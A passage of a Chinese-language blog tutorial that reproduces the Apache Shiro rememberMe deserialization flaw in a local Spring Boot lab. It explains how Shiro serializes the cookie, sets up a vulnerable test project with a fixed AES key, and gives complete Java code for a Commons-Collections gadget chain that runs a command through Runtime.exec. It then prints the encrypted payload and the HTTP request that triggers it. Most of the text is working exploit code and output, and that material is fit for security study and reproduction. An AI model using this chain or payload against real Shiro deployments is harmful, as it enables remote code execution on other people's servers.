</span></span><span style=display:flex><span>    PrincipalCollection principals <span style=color:#ff79c6>=</span> getIdentityToRemember(subject, authcInfo);
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// 实现记住登录</span>
</span></span><span style=display:flex><span>    rememberIdentity(subject, principals);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>rememberIdentity</code> 方法如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>protected</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>rememberIdentity</span>(Subject subject, PrincipalCollection accountPrincipals) {
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// 将身份认证信息序列化为字节数组</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> bytes <span style=color:#ff79c6>=</span> convertPrincipalsToBytes(accountPrincipals);
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// 将字节数组写入到Cookie中</span>
</span></span><span style=display:flex><span>    rememberSerializedIdentity(subject, bytes);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>convertPrincipalsToBytes</code> 方法如下：</p><pre tabindex=0><code>protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) {
    // 将身份认证信息序列化为字节数组，最终会调用 DefaultSerializer 的 serialize 方法
    byte[] bytes = serialize(principals);
    if (getCipherService() != null) {
        // 如果加密服务存在则进行一次AES加密，在加密时会使用当前设置的密钥
        bytes = encrypt(bytes);
    }
    return bytes;
}
</code></pre><p><code>rememberSerializedIdentity</code> 方法如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>protected</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>rememberSerializedIdentity</span>(Subject subject, <span style=color:#8be9fd>byte</span><span style=color:#ff79c6>[]</span> serialized) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>!</span>WebUtils.<span style=color:#50fa7b>isHttp</span>(subject)) {
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (log.<span style=color:#50fa7b>isDebugEnabled</span>()) {
</span></span><span style=display:flex><span>            String msg <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet &#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                    <span style=color:#f1fa8c>&#34;request and response in order to set the rememberMe cookie. Returning immediately and &#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                    <span style=color:#f1fa8c>&#34;ignoring rememberMe operation.&#34;</span>;
</span></span><span style=display:flex><span>            log.<span style=color:#50fa7b>debug</span>(msg);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    HttpServletRequest request <span style=color:#ff79c6>=</span> WebUtils.<span style=color:#50fa7b>getHttpRequest</span>(subject);
</span></span><span style=display:flex><span>    HttpServletResponse response <span style=color:#ff79c6>=</span> WebUtils.<span style=color:#50fa7b>getHttpResponse</span>(subject);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#6272a4>//base 64 encode it and store as a cookie:</span>
</span></span><span style=display:flex><span>    String base64 <span style=color:#ff79c6>=</span> Base64.<span style=color:#50fa7b>encodeToString</span>(serialized);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Cookie template <span style=color:#ff79c6>=</span> getCookie(); <span style=color:#6272a4>//the class attribute is really a template for the outgoing cookies</span>
</span></span><span style=display:flex><span>    Cookie cookie <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> SimpleCookie(template);
</span></span><span style=display:flex><span>    cookie.<span style=color:#50fa7b>setValue</span>(base64);
</span></span><span style=display:flex><span>    cookie.<span style=color:#50fa7b>saveTo</span>(request, response);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>最终会将身份认证信息写入到 Cookie 中。</p><p>反序列化的过程类似，不过是把这个流程反过来。因此我们可以得出一个结论。</p><p><strong>只要目标系统中同时有使用 shiro 和 commons-collections 3.1，并且在得知了AES密钥，即可触发远程命令执行漏洞。</strong></p><h3 id=0x01-搭建测试环境>0x01 搭建测试环境</h3><p>我们使用 <code>springboot</code> 搭建一个测试环境。</p><p>使用 <code>maven</code> 创建好一个包含 <code>web</code> 的 <code>springboot</code> 项目后，在 <code>pom.xml</code> 增加两个依赖：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#ff79c6>&lt;dependency&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;groupId&gt;</span>commons-collections<span style=color:#ff79c6>&lt;/groupId&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;artifactId&gt;</span>commons-collections<span style=color:#ff79c6>&lt;/artifactId&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;version&gt;</span>3.2.1<span style=color:#ff79c6>&lt;/version&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;/dependency&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;dependency&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;groupId&gt;</span>org.apache.shiro<span style=color:#ff79c6>&lt;/groupId&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;artifactId&gt;</span>shiro-spring-boot-web-starter<span style=color:#ff79c6>&lt;/artifactId&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>&lt;version&gt;</span>1.8.0<span style=color:#ff79c6>&lt;/version&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>&lt;/dependency&gt;</span>
</span></span></code></pre></div><p>然后增加两个类配置 <code>shiro</code> 。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.shiro.realm.Realm;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.shiro.realm.text.TextConfigurationRealm;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.springframework.context.annotation.Bean;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.springframework.context.annotation.Configuration;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>@Configuration
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>ShiroRealmConfig</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    @Bean
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> Realm <span style=color:#50fa7b>realm</span>() {
</span></span><span style=display:flex><span>        TextConfigurationRealm realm <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> TextConfigurationRealm();
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// 配置账户信息</span>
</span></span><span style=display:flex><span>        realm.<span style=color:#50fa7b>setUserDefinitions</span>(<span style=color:#f1fa8c>&#34;user=password,user\n&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;admin=password,admin&#34;</span>);
</span></span><span style=display:flex><span>        realm.<span style=color:#50fa7b>setRoleDefinitions</span>(<span style=color:#f1fa8c>&#34;admin=read,write\n&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;user=read&#34;</span>);
</span></span><span style=display:flex><span>        realm.<span style=color:#50fa7b>setCachingEnabled</span>(<span style=color:#ff79c6>true</span>);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> realm;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.shiro.mgt.SecurityManager;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.shiro.web.mgt.CookieRememberMeManager;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.shiro.web.mgt.DefaultWebSecurityManager;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.springframework.context.annotation.Configuration;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> javax.annotation.PostConstruct;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> javax.annotation.Resource;
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.util.Base64;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>@Configuration
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>ShiroSecurityConfig</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    @Resource
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>private</span> SecurityManager securityManager;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    @PostConstruct
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>init</span>() {
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// 配置记住登录管理器，并且设置 AES 加密的 key</span>
</span></span><span style=display:flex><span>        CookieRememberMeManager cookieRememberMeManager <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> CookieRememberMeManager();
</span></span><span style=display:flex><span>        cookieRememberMeManager.<span style=color:#50fa7b>setCipherKey</span>(Base64.<span style=color:#50fa7b>getDecoder</span>().<span style=color:#50fa7b>decode</span>(<span style=color:#f1fa8c>&#34;zSyK5Kp6PZAAjlT+eeNMlg==&#34;</span>));
</span></span><span style=display:flex><span>        ((DefaultWebSecurityManager) securityManager).<span style=color:#50fa7b>setRememberMeManager</span>(cookieRememberMeManager);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>最后启动项目。</p><h3 id=0x02-生成-payload>0x02 生成 payload</h3><pre tabindex=0><code>import cn.typesafe.jsv.util.Serializer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Exp5 {

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&#34;getMethod&#34;, new Class[]{String.class, Class[].class}, new Object[]{&#34;getRuntime&#34;, null}),
                new InvokerTransformer(&#34;invoke&#34;, new Class[]{Object.class, Object[].class}, new Object[2]),
                new InvokerTransformer(&#34;exec&#34;, new Class[]{String.class}, new Object[]{&#34;calc&#34;})
        };
        Transformer transformerChain = ChainedTransformer.getInstance(transformers);

        // 在调用 get 方法时传入一个不存在的 key 时会调用 Transformer 的 transform 方法
        Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);
        // 在调用 toString 方法时会自动调用 getValue 方法并使用 构造方法传入的 key 当作 key
        TiedMapEntry entry = new TiedMapEntry(lazyMap, &#34;foo&#34;);
        // 创建BadAttributeValueExpException对象，类型是 public 的，无需使用反射创建
        BadAttributeValueExpException obj = new BadAttributeValueExpException(null);
        // 成员 val 没有setVal 方法，只能通过反射修改
        Field valField = obj.getClass().getDeclaredField(&#34;val&#34;);
        valField.setAccessible(true);
        valField.set(obj, entry);

        /*-----------------------以下是序列化和反序列化测试----------------------------*/
        final byte[] bytes = Serializer.serialize(obj);

        byte[] key = Base64.getDecoder().decode(&#34;zSyK5Kp6PZAAjlT+eeNMlg==&#34;);

        // 创建一个 shiro 的 AES 加密服务类
        AesCipherService aesCipherService = new AesCipherService();
        // 使用 AES 加密序列化后的字节数组
        ByteSource encrypt = aesCipherService.encrypt(bytes, key);
        // 将加密后的字节数组转换使用 Base64 编码后输出
        String encoder = Base64.getEncoder().encodeToString(encrypt.getBytes());
        System.out.println(&#34;序列化后+AES加密+base64 encode：&#34; + encoder);

        /*// 使用Base64 解码字符串为字节数组， 并使用AES 解密字节数组
        ByteSource decrypt = aesCipherService.decrypt(Base64.getDecoder().decode(encoder), key);
        // 反序列化为对象
        final Object o = Serializer.deserialize(decrypt.getBytes());
        System.out.println(&#34;反序列化+AES解密+base64 decode：&#34; + o);*/
    }
}
</code></pre><p>运行后输出：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>序列化后+AES加密+base64 encode：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
</span></span></code></pre></div><p>冒号后面的就是我们需要的 <strong>payload</strong>。</p><h3 id=0x03-一发入魂>0x03 一发入魂</h3><p>我这里还是使用 <code>IDEA</code> 自带的工具进行测试。</p><p>新建一个 <code>poc.http</code> 文件写入一下内容</p><pre tabindex=0><code>GET http://localhost:8080/
Cookie: JSESSIONID=x; rememberMe=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
</code></pre><p>点击发送请求，便可以看到本地计算机打开了计算器程序。</p><h2 id=注>注</h2><p>文中测试使用系统和工具版本如下：</p><ul><li><strong>操作系统</strong> windows 10 20H2</li><li><strong>jdk</strong> java 1.8.0_301</li><li><strong>springboot</strong> 2.5.5</li><li><strong>commons-collections</strong> 3.1</li><li><strong>shiro</strong> 1.8.0</li><li><strong>代码仓库</strong> <a href=https://github.com/dushixiang/java-serialization-vulnerability>https://github.com/dushixiang/java-serialization-vulnerability</a></li></ul><h2 id=其他>其他</h2><p>经过测试 <code>commons-collections 3.2.1</code> 版本同样可以复现上述问题，<code>commons-collections 3.2.2</code> 不可复现。</p><h2 id=参考>参考</h2><p><a href=https://github.com/frohoff/ysoserial>https://github.com/frohoff/ysoserial</a></p></article></div></main></body></html>